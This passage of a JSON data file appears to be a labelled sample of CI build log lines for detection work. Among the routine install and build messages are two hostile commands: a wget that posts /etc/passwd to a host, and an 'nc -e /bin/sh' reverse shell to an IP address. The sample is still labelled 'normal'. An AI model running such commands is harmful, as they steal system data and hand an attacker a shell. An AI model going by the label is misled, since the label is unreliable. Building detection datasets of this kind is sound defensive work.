          "Installing axios@5.5.0",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "nc -e /bin/sh 226.102.253.12 54248",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 8/10: Building",
          "\u2713 build completed",
          "Installing axios@2.9.0",
          "FAILED: test_cache_hit",
          "Compiling src/main.py...",
          "=== Step checkout completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}